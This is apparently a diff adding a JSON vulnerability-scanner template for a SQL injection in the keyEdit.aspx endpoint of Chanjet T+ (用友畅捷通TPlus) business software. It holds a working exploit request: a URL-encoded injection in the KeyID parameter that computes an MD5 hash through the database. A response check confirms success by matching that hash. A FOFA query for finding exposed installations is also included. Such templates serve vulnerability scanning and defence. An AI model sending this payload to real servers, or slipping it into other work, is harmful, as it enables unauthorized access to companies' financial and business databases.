@@ -1,0 +1,37 @@
+{
+  "product": "用友畅捷通TPlus",
+  "vul_name": "用友畅捷通TPlus keyEdit.aspx接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"畅捷通-TPlus\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/oWonF1xKEVpQKlg4zfcMLA",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes('MD5','123456')))%20--&preload=1"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
